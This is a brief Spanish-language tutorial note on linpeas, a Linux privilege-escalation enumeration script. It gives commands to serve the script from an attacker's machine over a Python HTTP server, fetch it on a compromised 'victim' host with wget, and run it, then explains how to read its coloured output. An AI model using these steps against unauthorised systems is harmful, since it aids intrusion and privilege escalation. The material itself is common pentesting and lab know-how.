# linpeas - privesc script
# Otras versiones -> https://github.com/carlospolop/PEASS-ng/releases
linpeas es un script en bash que ejecuta una gran cantidad de comandos para detectar missconfigurations en un servidor Linux
y cuya finalidad es proporcionar caminos de escalada de privilegios. Es muy util en situaciones en las que ya contamos con
acceso a la maquina victima ya sea por ssh o por RCE.

Una vez descargado el script deberemos transferirlo a la maquina victima. Esto se puede hacer muy sencillo abriendo un servidor
con python en nuestra maquina local y descargandola desde la victima. Tambien se puede hacer con scp. Despues bastara con ejecutarlo
en la maquina victima


Maquina local(host):

    cd /ruta/local/linpeas/linpeas.sh
    
    python3 -m http.server 9001


Maquina remota(victim):

    wget http://[IP_MAQUINA_LOCAL]:9001/linpeas.sh
    
    chmod +x linpeas.sh
    
    ./linpeas.sh
 
 
Una vez analicemos su output, deberemos fijarnos principalmente en el contenido que tenga el fondo naranja, aunque llamara la atencion
segun vaya generando el output. En caso de no reportar nada en naranja, deberemos mirar el color rojo, ya que puede existir un
metodo de ecalada de privilegios en alguno de estos casos.
